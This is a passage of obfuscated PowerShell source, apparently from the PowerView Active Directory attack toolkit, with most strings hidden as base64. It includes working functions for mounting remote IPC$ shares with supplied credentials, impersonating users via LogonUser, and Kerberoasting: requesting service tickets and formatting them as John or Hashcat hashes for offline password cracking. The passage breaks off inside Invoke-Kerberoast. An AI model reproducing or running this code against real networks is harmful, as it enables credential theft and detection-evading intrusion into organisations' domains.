                    Write-Verbose "[Convert-ADName] Error initializing translation for '$Identity' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $Null = Invoke-Method $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdAA='))) (
                        $ADSInitType,
                        $InitName
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$Identity' : $_"
                }
            }
            Set-Property $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcwBlAFIAZQBmAGUAcgByAGEAbAA='))) (0x60)
            try {
                $Null = Invoke-Method $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA'))) (8, $TargetIdentity)
                Invoke-Method $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))) ($ADSOutputType)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}
function ConvertFrom-UACValue {
    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,
        [Switch]
        $ShowAll
    )
    BEGIN {
        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBDAFIASQBQAFQA'))), 1)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEMATwBVAE4AVABEAEkAUwBBAEIATABFAA=='))), 2)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABPAE0ARQBEAEkAUgBfAFIARQBRAFUASQBSAEUARAA='))), 8)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABPAEMASwBPAFUAVAA='))), 16)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAEQAXwBOAE8AVABSAEUAUQBEAA=='))), 32)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAEQAXwBDAEEATgBUAF8AQwBIAEEATgBHAEUA'))), 64)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBOAEMAUgBZAFAAVABFAEQAXwBUAEUAWABUAF8AUABXAEQAXwBBAEwATABPAFcARQBEAA=='))), 128)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABFAE0AUABfAEQAVQBQAEwASQBDAEEAVABFAF8AQQBDAEMATwBVAE4AVAA='))), 256)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFIATQBBAEwAXwBBAEMAQwBPAFUATgBUAA=='))), 512)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBOAFQARQBSAEQATwBNAEEASQBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAA='))), 2048)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBPAFIASwBTAFQAQQBUAEkATwBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAA='))), 4096)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAFIAVgBFAFIAXwBUAFIAVQBTAFQAXwBBAEMAQwBPAFUATgBUAA=='))), 8192)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAEUAWABQAEkAUgBFAF8AUABBAFMAUwBXAE8AUgBEAA=='))), 65536)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBOAFMAXwBMAE8ARwBPAE4AXwBBAEMAQwBPAFUATgBUAA=='))), 131072)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEEAUgBUAEMAQQBSAEQAXwBSAEUAUQBVAEkAUgBFAEQA'))), 262144)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARABfAEYATwBSAF8ARABFAEwARQBHAEEAVABJAE8ATgA='))), 524288)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwBEAEUATABFAEcAQQBUAEUARAA='))), 1048576)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAXwBEAEUAUwBfAEsARQBZAF8ATwBOAEwAWQA='))), 2097152)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAFIARQBRAF8AUABSAEUAQQBVAFQASAA='))), 4194304)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAE8AUgBEAF8ARQBYAFAASQBSAEUARAA='))), 8388608)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARABfAFQATwBfAEEAVQBUAEgAXwBGAE8AUgBfAEQARQBMAEUARwBBAFQASQBPAE4A'))), 16777216)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFIAVABJAEEATABfAFMARQBDAFIARQBUAFMAXwBBAEMAQwBPAFUATgBUAA=='))), 67108864)
    }
    PROCESS {
        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary
        if ($ShowAll) {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)+")
                }
                else {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        $ResultUACValues
    }
}
function Get-PrincipalContext {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    try {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] -or ($Identity -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA'))))) {
            if ($Identity -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                $ConvertedIdentity = $Identity | Convert-ADName -OutputType Canonical
                if ($ConvertedIdentity) {
                    $ConnectTarget = $ConvertedIdentity.SubString(0, $ConvertedIdentity.IndexOf('/'))
                    $ObjectIdentity = $Identity.Split('\')[1]
                    Write-Verbose "[Get-PrincipalContext] Binding to domain '$ConnectTarget'"
                }
            }
            else {
                $ObjectIdentity = $Identity
                Write-Verbose "[Get-PrincipalContext] Binding to domain '$Domain'"
                $ConnectTarget = $Domain
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAFUAcwBpAG4AZwAgAGEAbAB0AGUAcgBuAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAA==')))
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget)
            }
        }
        else {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAFUAcwBpAG4AZwAgAGEAbAB0AGUAcgBuAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAA==')))
                $DomainName = Get-Domain | Select-Object -ExpandProperty Name
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainName, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $ObjectIdentity = $Identity
        }
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdAA='))) $Context
        $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA=='))) $ObjectIdentity
        $Out
    }
    catch {
        Write-Warning "[Get-PrincipalContext] Error creating binding for object ('$Identity') context : $_"
    }
}
function Add-RemoteConnection {
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,
        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential
    )
    BEGIN {
        $NetResourceInstance = [Activator]::CreateInstance($NETRESOURCEW)
        $NetResourceInstance.dwType = 1
    }
    PROCESS {
        $Paths = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($TargetPath in $Paths) {
            $NetResourceInstance.lpRemoteName = $TargetPath
            Write-Verbose "[Add-RemoteConnection] Attempting to mount: $TargetPath"
            $Result = $Mpr::WNetAddConnection2W($NetResourceInstance, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)
            if ($Result -eq 0) {
                Write-Verbose "$TargetPath successfully mounted"
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}
function Remove-RemoteConnection {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )
    PROCESS {
        $Paths = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($TargetPath in $Paths) {
            Write-Verbose "[Remove-RemoteConnection] Attempting to unmount: $TargetPath"
            $Result = $Mpr::WNetCancelConnection2($TargetPath, 0, $True)
            if ($Result -eq 0) {
                Write-Verbose "$TargetPath successfully ummounted"
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}
function Invoke-UserImpersonation {
    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,
        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,
        [Switch]
        $Quiet
    )
    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBUAEEA')))) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGkAZQB0AA==')))])) {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFUAcwBlAHIASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBdACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAaQBzACAAbgBvAHQAIABjAHUAcgByAGUAbgB0AGwAeQAgAGkAbgAgAGEAIABzAGkAbgBnAGwAZQAtAHQAaAByAGUAYQBkAGUAZAAgAGEAcABhAHIAdABtAGUAbgB0ACAAcwB0AGEAdABlACwAIAB0AG8AawBlAG4AIABpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuACAAbQBhAHkAIABuAG8AdAAgAHcAbwByAGsALgA=')))
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEgAYQBuAGQAbABlAA==')))]) {
        $LogonTokenHandle = $TokenHandle
    }
    else {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        $UserName = $NetworkCredential.UserName
        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"
        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle);$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
        if (-not $Result) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        }
    }
    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)
    if (-not $Result) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFUAcwBlAHIASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBdACAAQQBsAHQAZQByAG4AYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAZQBkAA==')))
    $LogonTokenHandle
}
function Invoke-RevertToSelf {
    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEgAYQBuAGQAbABlAA==')))]) {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFIAZQB2AGUAcgB0AFQAbwBTAGUAbABmAF0AIABSAGUAdgBlAHIAdABpAG4AZwAgAHQAbwBrAGUAbgAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AIABhAG4AZAAgAGMAbABvAHMAaQBuAGcAIABMAG8AZwBvAG4AVQBzAGUAcgAoACkAIAB0AG8AawBlAG4AIABoAGEAbgBkAGwAZQA=')))
        $Result = $Kernel32::CloseHandle($TokenHandle)
    }
    $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
    if (-not $Result) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFIAZQB2AGUAcgB0AFQAbwBTAGUAbABmAF0AIABUAG8AawBlAG4AIABpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIAByAGUAdgBlAHIAdABlAGQA')))
}
function Get-DomainSPNTicket {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAA=='))) })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBJAGQAZQBuAHQAaQB0AHkATQBvAGQAZQBsAA=='))))
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))]) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }
        ForEach ($Object in $TargetObject) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))]) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
                $DistinguishedName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
            }
            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $UserSPN = $UserSPN[0]
            }
            try {
                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            }
            catch {
                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if ($Ticket) {
                $TicketByteStream = $Ticket.GetRequest()
            }
            if ($TicketByteStream) {
                $Out = New-Object PSObject
                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
                $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $SamAccountName
                $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))) $DistinguishedName
                $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlAA=='))) $Ticket.ServicePrincipalName
                if($TicketHexStream -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQAzADgAMgAuAC4ALgAuADMAMAA4ADIALgAuAC4ALgBBADAAMAAzADAAMgAwADEAKAA/ADwARQB0AHkAcABlAEwAZQBuAD4ALgAuACkAQQAxAC4AewAxACwANAB9AC4ALgAuAC4ALgAuAC4AQQAyADgAMgAoAD8APABDAGkAcABoAGUAcgBUAGUAeAB0AEwAZQBuAD4ALgAuAC4ALgApAC4ALgAuAC4ALgAuAC4ALgAoAD8APABEAGEAdABhAFQAbwBFAG4AZAA+AC4AKwApAA==')))) {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQA0ADgAMgA=')))) {
                        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $Hash = $null
                        $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                    } else {
                        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                }
                if($Hash) {
                    if ($OutputFormat -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBvAGgAbgA=')))) {
                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($DistinguishedName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))) {
                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                        else {
                            $UserDomain = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
                        }
                        $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABhAHMAaAA='))) $HashFormat
                }
                $Out.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAFAATgBUAGkAYwBrAGUAdAA='))))
                $Out
            }
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function Invoke-Kerberoast {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $UserSearcherArguments = @{
            'SPN' = $True
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAcwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
